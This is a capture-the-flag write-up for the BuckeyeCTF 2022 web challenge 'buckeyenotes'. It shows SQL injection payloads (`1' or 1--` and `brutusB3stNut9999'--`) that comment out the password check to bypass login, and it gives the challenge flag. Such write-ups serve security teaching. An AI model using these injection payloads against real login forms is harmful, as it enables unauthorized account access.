# BuckeyeCTF2022 Writeup

### web/buckeyenotes/beginner

<details open>
  <h3>Method: SQL Injection</h3>  
  <img src="https://user-images.githubusercontent.com/54641137/200134110-1377c898-e6d1-4ee5-8c8d-610b5fbc47b7.png" />  
  
  Entering `admin` in the username field and `1' or 1--` in the password field would essentially populate the SQL query as shown below:  
  >SELECT * FROM users WHERE username='`admin`' and password='`1' or 1--`'
  
  which is equivalent to
  
  >SELECT * FROM users WHERE username='`admin`' and password='`1' or 1--
  
  Note: `--` would comment out the rest of the SQL query

  Therefore, to hack the website, given the username `brutusB3stNut9999`, enter `brutusB3stNut9999'--` in the username field.
  <img src="https://user-images.githubusercontent.com/54641137/200134639-e0a5ae8f-23e8-4d0f-bfcc-a45b0350c350.png" />  

  >SELECT * FROM users WHERE username='`brutusB3stNut9999'--` and password=''
  
  which is equivalent to
  
  >SELECT * FROM users WHERE username='`brutusB3stNut9999'--`
  
  Therefore, as you can see from the SQL query above, you would not need to know what the password is since the SQL query is not checking the password at all.
</details>

Flag: `buckeye{wr1t3_ur_0wn_0p3n_2_pwn}`
